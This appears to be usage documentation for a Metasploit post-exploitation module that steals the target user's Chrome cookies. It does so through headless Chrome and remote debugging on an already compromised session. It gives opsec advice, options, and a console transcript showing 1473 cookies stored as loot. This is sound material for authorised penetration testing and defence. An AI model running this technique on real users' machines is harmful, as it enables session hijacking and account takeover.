## Gather Chrome Cookies

Uses [Headless Chrome](https://developers.google.com/web/updates/2017/04/headless-chrome) and [Chrome's Remote Debugging](https://chromedevtools.github.io/devtools-protocol/) to read all cookies from the Default Chrome profile of the user.

## Opsec

This writes to disk temporarily. You may want to consider the tradeoff between getting the user's Chrome cookies and the noisiness of writing to disk.

The module writes a random 10-15 character file containing HTML to a directory you can specify via `WRITABLE_DIR`.

## Vulnerable Application

This technique works on Chrome 59 or later on all operating systems. This module has been tested on Windows, Linux, and OSX. Windows shell sessions are currently not supported.

Chrome does not need to be running on the target machine for this module to work.

## Verification Steps

  1. Obtain a session on the target machine
  2. Do: ```use post/multi/gather/chrome_cookies```
  3. Do: ```set SESSION <your session ID>```
  4. Do: ```run```
  5. The current user's Chrome cookies will be stored as loot

## Options

  **CHROME_BINARY_PATH**

  The path to the user's Chrome binary. On Linux this defaults to searching for `google-chrome` in `$PATH`. On macOS, this defaults to `/Applications/Google Chrome.app/Contents/MacOS/Google Chrome'`. If the module doesn't find any cookies, it may be that a different Chrome binary to the one the user normally uses is being run. In that case, you can change the Chrome binary executed with this option.

  **WRITABLE_DIR**

  Directory used to write temporary files.

  Two files are written, with random 10-15 character alphanumeric filenames. One file contains an html file for Chrome and the other is where the cookies are saved. Both files are deleted during cleanup.

  **REMOTE_DEBUGGING_PORT**

  Port to tell Chrome to expose Remote Debugging on. Default is the normal remote debugging port, `9222`.

## Scenarios

### Linux (or OS X)

  Suppose you've got a session on the target machine.

  To extract the target user's Chrome cookies

```
msf > use post/multi/gather/chrome_cookies 
msf post(multi/gather/chrome_cookies) > options

Module options (post/multi/gather/chrome_cookies):

   Name                   Current Setting  Required  Description
   ----                   ---------------  --------  -----------
   CHROME_BINARY_PATH                      no        The path to the user's Chrome binary (leave blank to use the default for the OS)
   REMOTE_DEBUGGING_PORT  9222             no        Port on target machine to use for remote debugging protocol
   SESSION                1                yes       The session to run this module on.
   WRITABLE_DIR       /tmp             no        Where to write the html used to steal cookies temporarily

msf post(multi/gather/chrome_cookies) > set session <your session id>
session => <your session id>
msf post(multi/gather/chrome_cookies) > run

[*] Activated Chrome's Remote Debugging via google-chrome --headless --disable-web-security --disable-plugins --user-data-dir="/home/<username>/.config/google-chrome/" --remote-debugging-port=9222 /tmp/qj9ADWM6Xqh
[+] 1473 Chrome Cookies stored in /home/<local_username>/.msf4/loot/20181209094655_default_127.0.0.1_chrome.gather.co_585357.txt
[*] Post module execution completed
```

## Future features

### Profiles
This module only extracts cookies from the default Chrome profile. The target may have multiple, and you may which to extract cookies from all of them. This would require enumerating and extracting the profiles by name. Example code to extract cookies from a non-default Chrome profile can be found at https://github.com/defaultnamehere/cookie_crimes.

## See also
See https://github.com/defaultnamehere/cookie_crimes for more information and manual instructions for Windows.

See https://mango.pdf.zone/stealing-chrome-cookies-without-a-password for the blog post in which this technique was first published.
